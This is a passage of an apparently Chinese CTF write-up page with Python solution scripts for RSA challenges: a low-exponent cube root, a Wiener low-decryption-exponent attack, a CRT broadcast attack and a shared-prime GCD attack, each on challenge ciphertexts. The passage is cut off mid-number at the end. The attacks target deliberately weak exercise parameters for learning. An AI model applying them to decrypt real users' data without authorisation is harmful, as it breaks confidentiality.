class="string">425392137</span></span><br><span class="line"><span class="string">704796792</span></span><br><span class="line"><span class="string">458265677</span></span><br><span class="line"><span class="string">341524652</span></span><br><span class="line"><span class="string">483295235</span></span><br><span class="line"><span class="string">534149509</span></span><br><span class="line"><span class="string">425392137</span></span><br><span class="line"><span class="string">428313374</span></span><br><span class="line"><span class="string">425392137</span></span><br><span class="line"><span class="string">341524652</span></span><br><span class="line"><span class="string">458265677</span></span><br><span class="line"><span class="string">263072905</span></span><br><span class="line"><span class="string">483295235</span></span><br><span class="line"><span class="string">828509797</span></span><br><span class="line"><span class="string">341524652</span></span><br><span class="line"><span class="string">425392137</span></span><br><span class="line"><span class="string">475206804</span></span><br><span class="line"><span class="string">428313374</span></span><br><span class="line"><span class="string">483295235</span></span><br><span class="line"><span class="string">475206804</span></span><br><span class="line"><span class="string">459788476</span></span><br><span class="line"><span class="string">306220148</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">li = cipher.split()</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li:</span><br><span class="line">    flag+=chr(pow(int(i),d,n))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>
<h3 id="Dangerous-RSA-低加密指数攻击"><a href="#Dangerous-RSA-低加密指数攻击" class="headerlink" title="Dangerous RSA(低加密指数攻击)"></a>Dangerous RSA(低加密指数攻击)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">N=<span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line">c=<span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(gmpy2.iroot(c+i*N, <span class="number">3</span>)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">        print(libnum.n2s(gmpy2.iroot(c+i*N, <span class="number">3</span>)[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i+<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="HDCTF2019-basic-rsa-p-q-e-c"><a href="#HDCTF2019-basic-rsa-p-q-e-c" class="headerlink" title="[HDCTF2019]basic rsa(p,q,e,c)"></a>[HDCTF2019]basic rsa(p,q,e,c)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p =gmpy2.mpz(<span class="number">262248800182277040650192055439906580479</span>)</span><br><span class="line">q =gmpy2.mpz(<span class="number">262854994239322828547925595487519915551</span>)</span><br><span class="line">e =gmpy2.mpz(<span class="number">65533</span>)</span><br><span class="line">phi_n= (p - <span class="number">1</span>) * (q - <span class="number">1</span></span><br><span class="line">)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">c=<span class="number">27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br><span class="line">n = p * q</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h3 id="rsa2-低解密指数攻击-e非常大"><a href="#rsa2-低解密指数攻击-e非常大" class="headerlink" title="rsa2(低解密指数攻击,e非常大)"></a>rsa2(低解密指数攻击,e非常大)</h3><p>已知n,e,求d<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> RSAwienerHacker</span><br><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line">d =  RSAwienerHacker.hack_RSA(e,N)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#需要在python2下运行</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">d=<span class="number">8920758995414587152829426558580025657357328745839747693739591820283538307445</span></span><br><span class="line">flag = <span class="string">"flag&#123;"</span> + hashlib.md5(hex(d)).hexdigest() + <span class="string">"&#125;"</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>
<h3 id="GUET-CTF2019-BabyRSA"><a href="#GUET-CTF2019-BabyRSA" class="headerlink" title="[GUET-CTF2019]BabyRSA"></a>[GUET-CTF2019]BabyRSA</h3><p>已知p+q,(p+1)(q+1),直接求出n=p*q<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">p_q=<span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span></span><br><span class="line">n=<span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span>-p_q<span class="number">-1</span></span><br><span class="line">c=<span class="number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span></span><br><span class="line">d=<span class="number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span></span><br><span class="line">print(libnum.n2s(pow(c,d,n)))</span><br></pre></td></tr></table></figure></p>
<h3 id="RSA5-低加密指数广播攻击"><a href="#RSA5-低加密指数广播攻击" class="headerlink" title="RSA5(低加密指数广播攻击)"></a>RSA5(低加密指数广播攻击)</h3><p>立马想到的使用中国剩余定理<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_parse_number</span><span class="params">(number)</span>:</span></span><br><span class="line">    string = <span class="string">"%x"</span> % number</span><br><span class="line">    <span class="comment">#if len(string) != 64:</span></span><br><span class="line">    <span class="comment">#    return ""</span></span><br><span class="line">    erg = []</span><br><span class="line">    <span class="keyword">while</span> string != <span class="string">''</span>:</span><br><span class="line">        erg = erg + [chr(int(string[:<span class="number">2</span>], <span class="number">16</span>))]</span><br><span class="line">        string = string[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(erg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extended_gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    x,y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    lastx, lasty = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, (q, b) = b, divmod(a,b)</span><br><span class="line">        x, lastx = lastx-q*x, x</span><br><span class="line">        y, lasty = lasty-q*y, y</span><br><span class="line">    <span class="keyword">return</span> (lastx, lasty, a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chinese_remainder_theorem</span><span class="params">(items)</span>:</span></span><br><span class="line">  N = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">    N *= n</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">    m = N/n</span><br><span class="line">    r, s, d = extended_gcd(n, m)</span><br><span class="line">    <span class="keyword">if</span> d != <span class="number">1</span>:</span><br><span class="line">      N=N/n</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">      <span class="comment">#raise "Input not pairwise co-prime"</span></span><br><span class="line">    result += a*s*m</span><br><span class="line">  <span class="keyword">return</span> result % N, N</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">c1 = m**e mod n1</span></span><br><span class="line"><span class="string">c2 = m**e mod n2</span></span><br><span class="line"><span class="string">c3 = m**e mod n3</span></span><br><span class="line"><span class="string"><span class="meta">... </span>...</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">sessions=[&#123;<span class="string">"c"</span>: <span class="number">7366067574741171461722065133242916080495505913663250330082747465383676893970411476550748394841437418105312353971095003424322679616940371123028982189502042</span>, <span class="string">"e"</span>: <span class="number">10</span>, <span class="string">"n"</span>: <span class="number">25162507052339714421839688873734596177751124036723831003300959761137811490715205742941738406548150240861779301784133652165908227917415483137585388986274803</span>&#125;,</span><br><span class="line">&#123;<span class="string">"c"</span>: <span class="number">21962825323300469151795920289886886562790942771546858500842179806566435767103803978885148772139305484319688249368999503784441507383476095946258011317951461</span>, <span class="string">"e"</span>: <span class="number">10</span>, <span class="string">"n"</span>: <span class="number">23976859589904419798320812097681858652325473791891232710431997202897819580634937070900625213218095330766877190212418023297341732808839488308551126409983193</span>&#125;,</span><br><span class="line">&#123;<span class="string">"c"</span>: <span class="number">6569689420274066957835983390583585286570087619048110141187700584193792695235405077811544355169290382357149374107076406086154103351897890793598997687053983</span>, <span class="string">"e"</span>: <span class="number">10</span>, <span class="string">"n"</span>: <span class="number">18503782836858540043974558035601654610948915505645219820150251062305120148745545906567548650191832090823482852604346478335353784501076761922605361848703623</span>&#125;,</span><br><span class="line">&#123;<span class="string">"c"</span>: <span class="number">4508246168044513518452493882713536390636741541551805821790338973797615971271867248584379813114125478195284692695928668946553625483179633266057122967547052</span>, <span class="string">"e"</span>: <span class="number">10</span>, <span class="string">"n"</span>: <span class="number">23383087478545512218713157932934746110721706819077423418060220083657713428503582801909807142802647367994289775015595100541168367083097506193809451365010723</span>&#125;,</span><br><span class="line">&#123;<span class="string">"c"</span>: <span class="number">22966105670291282335588843018244161552764486373117942865966904076191122337435542553276743938817686729554714315494818922753880198945897222422137268427611672</span>, <span class="string">"e"</span>: <span class="number">10</span>, <span class="string">"n"</span>: <span class="number">31775649089861428671057909076144152870796722528112580479442073365053916012507273433028451755436987054722496057749731758475958301164082755003195632005308493</span>&#125;,</span><br><span class="line">&#123;<span class="string">"c"</span>: <span class="number">17963313063405045742968136916219838352135561785389534381262979264585397896844470879023686508540355160998533122970239261072020689217153126649390825646712087</span>, <span class="string">"e"</span>: <span class="number">10</span>, <span class="string">"n"</span>: <span class="number">22246342022943432820696190444155665289928378653841172632283227888174495402248633061010615572642126584591103750338919213945646074833823905521643025879053949</span>&#125;,</span><br><span class="line">&#123;<span class="string">"c"</span>: <span class="number">1652417534709029450380570653973705320986117679597563873022683140800507482560482948310131540948227797045505390333146191586749269249548168247316404074014639</span>, <span class="string">"e"</span>: <span class="number">10</span>, <span class="string">"n"</span>: <span class="number">25395461142670631268156106136028325744393358436617528677967249347353524924655001151849544022201772500033280822372661344352607434738696051779095736547813043</span>&#125;,</span><br><span class="line">&#123;<span class="string">"c"</span>: <span class="number">15585771734488351039456631394040497759568679429510619219766191780807675361741859290490732451112648776648126779759368428205194684721516497026290981786239352</span>, <span class="string">"e"</span>: <span class="number">10</span>, <span class="string">"n"</span>: <span class="number">32056508892744184901289413287728039891303832311548608141088227876326753674154124775132776928481935378184756756785107540781632570295330486738268173167809047</span>&#125;,</span><br><span class="line">&#123;<span class="string">"c"</span>: <span class="number">8965123421637694050044216844523379163347478029124815032832813225050732558524239660648746284884140746788823681886010577342254841014594570067467905682359797</span>, <span class="string">"e"</span>: <span class="number">10</span>, <span class="string">"n"</span>: <span class="number">52849766269541827474228189428820648574162539595985395992261649809907435742263020551050064268890333392877173572811691599841253150460219986817964461970736553</span>&#125;,</span><br><span class="line">&#123;<span class="string">"c"</span>: <span class="number">13560945756543023008529388108446940847137853038437095244573035888531288577370829065666320069397898394848484847030321018915638381833935580958342719988978247</span>, <span class="string">"e"</span>: <span class="number">10</span>, <span class="string">"n"</span>: <span class="number">30415984800307578932946399987559088968355638354344823359397204419191241802721772499486615661699080998502439901585573950889047918537906687840725005496238621</span>&#125;]</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> session <span class="keyword">in</span> sessions:</span><br><span class="line">    e=session[<span class="string">'e'</span>]</span><br><span class="line">    n=session[<span class="string">'n'</span>]</span><br><span class="line">    msg=session[<span class="string">'c'</span>]</span><br><span class="line">    data += [(msg, n)]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Please wait, performing CRT"</span></span><br><span class="line">x, n = chinese_remainder_theorem(data)</span><br><span class="line">e=session[<span class="string">'e'</span>]</span><br><span class="line">realnum = gmpy.mpz(x).root(e)[<span class="number">0</span>].digits()</span><br><span class="line"><span class="keyword">print</span> my_parse_number(int(realnum))</span><br></pre></td></tr></table></figure><br>但是此处e较大，不太适合使用该方法。由于在不同的模数n中可能存在相同的p或者q,只要求出不同n之间的最大公约数p或q，就可得到私钥d,从而解出明文<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n0 = <span class="number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span></span><br><span class="line">c0 = <span class="number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span></span><br><span class="line">c1 = <span class="number">15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span></span><br><span class="line">c2 = <span class="number">4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span></span><br><span class="line">c3 = <span class="number">4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span></span><br><span class="line"></span><br><span class="line">n4 = <span class="number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span></span><br><span class="line">c4 = <span class="number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span></span><br><span class="line"></span><br><span class="line">n5 = <span class="number">21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span></span><br><span class="line">c5 = <span class="number">20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span></span><br><span class="line"></span><br><span class="line">n6 = <span class="number">25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span></span><br><span class="line">c6 = <span class="number">19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span></span><br><span class="line"></span><br><span class="line">n7 = <span class="number">22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span></span><br><span class="line">c7 = <span class="number">6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span></span><br><span class="line"></span><br><span class="line">n8 = <span class="number">23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span></span><br><span class="line">c8 = <span class="number">5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span></span><br><span class="line"></span><br><span class="line">n9 = <span class="number">28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span></span><br><span class="line">c9 = <span class="number">9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span></span><br><span class="line"></span><br><span class="line">n10 = <span class="number">22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span></span><br><span class="line">c10 = <span class="number">1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span></span><br><span class="line"></span><br><span class="line">n11 = <span class="number">27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span></span><br><span class="line">c11 = <span class="number">21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span></span><br><span class="line"></span><br><span class="line">n12 = <span class="number">20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span></span><br><span class="line">c12 = <span class="number">14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span></span><br><span class="line"></span><br><span class="line">n13 = <span class="number">27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span></span><br><span class="line">c13 = <span class="number">3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span></span><br><span class="line"></span><br><span class="line">n14 = <span class="number">27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span></span><br><span class="line">c14 = <span class="number">14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span></span><br><span class="line"></span><br><span class="line">n15 = <span class="number">25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span></span><br><span class="line">c15 = <span 